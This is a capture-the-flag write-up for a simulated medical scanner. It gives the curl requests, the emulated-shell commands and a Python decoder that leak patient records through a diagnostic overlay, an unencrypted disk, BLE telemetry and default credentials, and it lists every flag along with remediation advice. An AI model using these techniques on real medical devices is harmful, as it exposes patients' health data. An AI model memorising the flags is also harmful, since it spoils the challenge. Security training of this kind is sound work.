# "Second Opinion" — DCTF 2026 (Medical Device) Write-up

**Category:** Medical Device / IoT
**Target:** `http://emedra.dctf.io:8080/`
**Author:** syyntax
**Flag format:** `deadface{flag-text}`

> *On the touchscreen, the current patient is redacted to initials and a masked
> record number. Even without a login, it might be possible to determine sensitive
> information about the patient. There are ports available on the device that are
> used for maintenance, but they're not locked or concealed with a plate. See if
> you can find information by using a tool from your toolkit.*

---

## 1. The short answer

```
deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}
```

The hint is literal: the HDMI **maintenance/mirror port** is not locked, and the
engineer diagnostic overlay it exposes can be cranked to a verbosity that turns
off field redaction — dumping the whole patient record.

This challenge actually ships **several** flags, one per attack surface (HDMI,
terminal/USB-A storage, BLE, and default kiosk credentials). The full list is in
[§7](#7-all-flags-found).

---

## 2. Reconnaissance

### Port scan

```
$ nmap -p- --open -sV --min-rate 2000 -T4 emedra.dctf.io
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4
8080/tcp open  http    nginx 1.27.5
8081/tcp open  http    Werkzeug httpd 3.1.9 (Python 3.12.15)
```

- **8080** is the real operator console (an nginx-served Vite SPA).
- **8081** is a Flask/Werkzeug "maintenance" service — this turns out to be a red
  herring; every route we tried (`/`, `/api/*`, `/status`, …) returns 404. The
  actual "maintenance port" referenced in the hint is a *logical* device port in
  the app, not TCP 8081.
- **22** is not needed.

### The SPA

The landing page loads `/assets/index-*.js` and populates two things from
`/api/device`:

- a **TOOLKIT** (tools you can "plug in"), and
- interactive **hotspots** on a 3D/2D schematic of the device.

`GET /api/device`:

```json
{
  "device": "Emedra CerebraScan CS-9000",
  "vendor": "Emedra",
  "site": "St. Dymphna's RMC",
  "firmware": "NeuraOS 2.3.1",
  "tools": [
    {"id":"hdmi","label":"HDMI Cable","compatiblePorts":["hdmi"]},
    {"id":"displayport","label":"DisplayPort Cable","compatiblePorts":[]},
    {"id":"live-linux","label":"Live Linux USB-A","compatiblePorts":["usb-a"]},
    {"id":"rubber-ducky","label":"Rubber Ducky USB-A","compatiblePorts":["usb-a"]},
    {"id":"ble-sniffer","label":"BLE Sniffer USB-A","compatiblePorts":["usb-a"]}
  ],
  "hotspots": [
    {"id":"touchscreen","label":"Touchscreen","kind":"touchscreen"},
    {"id":"hdmi","label":"HDMI Port","kind":"port"},
    {"id":"usb-a","label":"USB-A Port","kind":"port"},
    {"id":"usb-c","label":"USB-C Maintenance Port","kind":"port"},
    {"id":"sticker","label":"Asset Label","kind":"label"}
  ]
}
```

The device has **4 ports** and the toolkit has **5 tools**. The API surface
(extracted from the JS bundle and the lazy-loaded chunks) is:

```
GET  /api/healthz
GET  /api/device
GET  /api/hotspot/:id
POST /api/connect              { tool, port } -> { ok, windowType, token }
GET  /api/external-display     ?level=N        (Bearer token)
POST /api/shell                { token, line } (Bearer token)
GET  /api/capture                              (Bearer token)
POST /api/kiosk/auth           { username, password }
GET  /api/kiosk/login          (HTML)
GET  /api/kiosk/patients       (Bearer token)
POST /api/kiosk/scan           { patientId }   (Bearer token)
POST /api/kiosk/hid            { token, macro }
GET  /api/kiosk/about
```

### The asset label (downloadable manual)

The `sticker` hotspot returns an asset label with a link:

```
GET /api/hotspot/sticker
"link": {"href":"/assets/cs9000-field-service-manual.pdf",
         "label":"Emedra CerebraScan CS-9000 — Field Service Manual (PDF)"}
```

Downloading and deflating the PDF streams (`FlateDecode`) gives a very useful
manual. Key excerpts:

- **§2.3 Default technician account**
  `Username: emedra-svc` / `Password: ChangeMe!2019`
  ("Change this password on first boot…")
- **§3.1 HDMI (video out)** — *"The external output includes an engineer diagnostic
  OSD … four diagnostic verbosity levels (0–3); **level 3 ('raw session dump')
  disables field redaction** for engineering use and must never be enabled with a
  patient study loaded."*
- **§3.2 USB-A (host)** — enabled in the field config for log export; accepts
  maintenance media.
- **§3.3 USB-C (service)** — normally covered by a tamper-evident seal; requires
  the vendor service dongle.
- **§5 BLE telemetry** — unauthenticated/unencrypted GATT notifications;
  `handle 0x37` is a base64 maintenance log chunked across sequence-numbered
  notifications.

The hint "ports … not locked or concealed with a plate" maps to the HDMI port
(normally this kind of diagnostic mirror would be protected) and the USB-C port
whose tamper-evident seal is missing.

---

## 3. Intended path — HDMI OSD leaks the whole patient

### 3.1 Connect the cable

```
$ curl -s -X POST http://emedra.dctf.io:8080/api/connect \
       -H 'content-type: application/json' \
       -d '{"tool":"hdmi","port":"hdmi"}'
{"ok":true,"windowType":"external-display","token":"a902fecd-…-a530cf"}
```

`POST /api/connect` returns a session token bound to that "window".

### 3.2 Probe the diagnostic overlay

```
$ TOKEN=a902fecd-…-a530cf
$ curl -s "http://emedra.dctf.io:8080/api/external-display?level=0" -H "authorization: Bearer $TOKEN"
```

At levels 0–2 the output is still redacted:

```json
{"osdLevel":2,"maxLevel":3,"raw":false,
 "patient":{"initials":"G.M.","maskedMrn":"****13"},
 "study":"Cranial perfusion, contrast",
 "system":["fb0: 1920x1080@60 overlay=on",
           "uptime 11:42:06 load 0.18 mem 612M/2G",
           "osd.verbosity=2 session.redaction=ON raw_dump=locked (needs level 3)"],
 "hint":"Engineer OSD. Raise the diagnostic level for raw session output."}
```

### 3.3 Level 3 — redaction off

```
$ curl -s "http://emedra.dctf.io:8080/api/external-display?level=3" -H "authorization: Bearer $TOKEN"
```

```json
{
  "source":"CEREBRASCAN DIAG MIRROR (FB0 1920x1080) — NeuraOS 2.3.1",
  "osdLevel":3, "maxLevel":3, "raw":true,
  "patient":{"name":"Gideon Marsh","dob":"1981-10-31","mrn":"100413"},
  "study":"Cranial perfusion, contrast",
  "technician":"Service Technician",
  "startedAt":"2026-03-14 09:22",
  "diagSession":"deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}"
}
```

**Flag:** `deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}`

No authentication. The touchscreen itself would only ever show `G.M.` / `****13`,
but the unlocked HDMI mirror hands over the full name, DOB, and MRN — plus the
`diagSession` flag.

---

## 4. Other attack surfaces (bonus flags)

### 4.1 Live Linux USB-A → mounted data partition

```
$ curl -s -X POST http://emedra.dctf.io:8080/api/connect \
       -H 'content-type: application/json' \
       -d '{"tool":"live-linux","port":"usb-a"}'
{"ok":true,"windowType":"terminal","token":"47bff131-…"}
```

You get an emulated Ubuntu live shell (`uid=1000(ubuntu)`, member of `sudo`).
`/home/ubuntu/README.txt` tells you the storage is unencrypted:

```
The scanner's internal storage is NOT encrypted.
List the block devices with `lsblk`, then mount the data partition:
    sudo mount /dev/sda2 /mnt
The ScanWorks install lives under /mnt/opt/scanworks.
```

```bash
$ lsblk
sda 32G
├─sda1 512M vfat  /boot/efi
└─sda2  31G ext4  scanworks-data

$ sudo mount /dev/sda2 /mnt
$ cat /mnt/opt/scanworks/config.yaml
```

```yaml
# Emedra ScanWorks - runtime configuration
site_id: stdymphna-rmc-01
upstream: https://api.emedra.example/v2

# Upstream API key (service account). TODO: move to secrets store before GA.
api_key: deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}

integrity:
  salt: EM-2019

debug_console:
  enabled: true
  function: debug.dump
  tables: [patients, calibration, audit]
```

Also on the partition: `scanworks.bin`, `logs/scanworks.log`,
`calibration/calib.json` (+ `.sig`, `verify.py`), and the patient DICOMs under
`/mnt/var/scanworks/patients/` — including `100413.dcm`:

```
$ strings /mnt/var/scanworks/patients/100413.dcm
DICM
PATIENT^Marsh^Gideon
MRN100413
MODALITY=MR
```

**Flag:** `deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}`

### 4.2 BLE sniffer → unencrypted maintenance log

```
$ curl -s -X POST http://emedra.dctf.io:8080/api/connect \
       -H 'content-type: application/json' \
       -d '{"tool":"ble-sniffer","port":"usb-a"}'
{"ok":true,"windowType":"ble-capture","token":"5feb9917-…"}
```

`GET /api/capture` returns a jumbled set of packets. Per the manual, the
`0x37` handle is the maintenance log, base64 text chunked across
sequence-numbered notifications. The payloads are hex-encoded ASCII.

```python
import urllib.request, json, base64
tok = "5feb9917-…"
req = urllib.request.Request("http://emedra.dctf.io:8080/api/capture",
                             headers={"authorization": "Bearer " + tok})
pkts = json.loads(urllib.request.urlopen(req).read())["packets"]

h37 = sorted((p for p in pkts if p["handle"] == "0x37"), key=lambda p: p["seq"])
b64 = "".join(bytes.fromhex(p["payload"]).decode() for p in h37)  # hex -> ASCII
print(base64.b64decode(b64).decode())
```

```
St.Dymphna CS-9000 maint log | site=stdymphna-rmc-01 | tech=emedra-svc
last_patient: Gideon Marsh (MRN 100413)
note: telemetry unencrypted per EM-2019 default; flag deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}
```

**Flag:** `deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}`

### 4.3 Kiosk login → default credentials

The `touchscreen` hotspot opens the ScanWorks kiosk. With the manual's factory
credentials:

```bash
$ curl -s -X POST http://emedra.dctf.io:8080/api/kiosk/auth \
       -H 'content-type: application/json' \
       -d '{"username":"emedra-svc","password":"ChangeMe!2019"}'
{"ok":true,"token":"ba07bc8e-…","tech":{"name":"Service Technician"},
 "maintenanceToken":"deadface{d3fault_cr3ds_n3v3r_ch4ng3d}"}
```

**Flag:** `deadface{d3fault_cr3ds_n3v3r_ch4ng3d}`

### 4.4 View-source decoy

`GET /api/kiosk/login` serves the login template, which contains a leftover dev
comment:

```html
<!-- TODO(dev): REMOVE before go-live — temporary QA technician PIN: deadface{v13w_s0urc3_sav3s_l1v3s} -->
```

**Value:** `deadface{v13w_s0urc3_sav3s_l1v3s}` (decoy / easy-find value)

### 4.5 Dead ends worth noting

- **USB-C "maintenance port"**: no tool mates with it —
  `POST /api/connect` with `hdmi`/`live-linux`/`rubber-ducky` → `"…doesn't connect
  to the USB-C Maintenance Port."` It's flavour explaining why the seal matters.
- **DisplayPort**: `compatiblePorts: []`; always "No signal — the DisplayPort
  cable doesn't mate with this port."
- **Rubber Ducky** (`POST /api/kiosk/hid`): payloads are "delivered, but no hidden
  console was triggered."
- **TCP 8081** (Werkzeug): 404 everywhere; no routes exposed.

---

## 5. Why the HDMI path is "the" flag

The prompt specifically contrasts **redaction on the touchscreen** with
**information obtainable without a login** via **unlocked maintenance ports**.
That is precisely the HDMI mirror: a maintenance-oriented diagnostic output that
defaults to a redacted overlay but can be raised to level 3 for a *raw session
dump*. Everything else (hardcoded key, BLE log, default creds) is a parallel
finding from the other toolkit tools.

---

## 6. Remediation

- Remove/disable the raw-dump diagnostic level, or require authenticated service
  access before raising OSD verbosity; never allow level 3 with a study loaded.
- Lock down maintenance mirror ports with tamper-evident hardware (and monitor the
  seal) instead of relying on a tamper-evident sticker.
- Force a password change at commissioning; never ship a shared factory account.
- Never store API keys in `config.yaml`; use a secrets store / per-device key
  (the manual even flags this: "replace with HMAC using the per-device key").
- Disable BLE telemetry, or at minimum encrypt/authenticate it, at any PHI site.

---

## 7. All flags found

| # | Vector | Value |
|---|--------|-------|
| 1 | **HDMI OSD level 3 (intended)** | `deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}` |
| 2 | BLE `0x37` maintenance log | `deadface{un3ncrypt3d_b4bbl3_fr0m_th3_sku11}` |
| 3 | `config.yaml` API key (terminal) | `deadface{h4rdc0d3d_k3ys_1n_th3_c0nf1g}` |
| 4 | Kiosk default credentials | `deadface{d3fault_cr3ds_n3v3r_ch4ng3d}` |
| 5 | `/api/kiosk/login` source comment (decoy) | `deadface{v13w_s0urc3_sav3s_l1v3s}` |

**Primary submission:** `deadface{hdm1_l34ks_th3_wh0l3_p4t13nt}`
